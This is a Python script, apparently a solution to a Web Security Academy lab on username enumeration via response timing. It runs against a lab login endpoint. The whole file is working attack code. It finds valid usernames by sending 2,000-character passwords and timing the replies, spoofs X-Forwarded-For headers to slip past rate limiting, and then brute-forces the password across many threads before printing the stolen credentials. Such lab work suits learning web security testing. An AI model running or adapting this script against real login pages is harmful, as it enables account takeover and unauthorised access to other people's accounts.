### LAB: Username enumeration via response timing

import requests
import threading

# Read username and password list
with open('username.txt', 'r') as file:
  usernames = [line.rstrip() for line in file]

with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0a04002703623824863c9a4a007e0000.web-security-academy.net'

username_ = ''
password_ = ''

def username_enum(username, i):
  header = { 'X-Forwarded-For' : f'{i}'}
  data = { 'username' : username, 'password' : 'a' * 2000 }
  response = requests.post(url = url + '/login', data = data, headers=header)
  if response.elapsed.total_seconds() > 8:
    global username_
    username_ = username

def find_password(username, password, i):
  header = { 'X-Forwarded-For' : f'{i + 2000}'}
  data = { 'username' : username, 'password' : password }
  response = requests.post(url = url + '/login', data = data, headers=header)
  if 'Invalid username or password' not in response.text:
    global password_
    password_ = password

# Create a thread to enumerate the username
threads = []
for i in range(len(usernames)):
  threads.append(threading.Thread(target=username_enum, args=(usernames[i], i, )))
  threads[i].start()

for i in range(len(usernames)):
  threads[i].join()
  

print(username_)
threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=find_password, args=(username_, passwords[i], i,)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()
  
print(f'Credentials: {username_} - {password_}')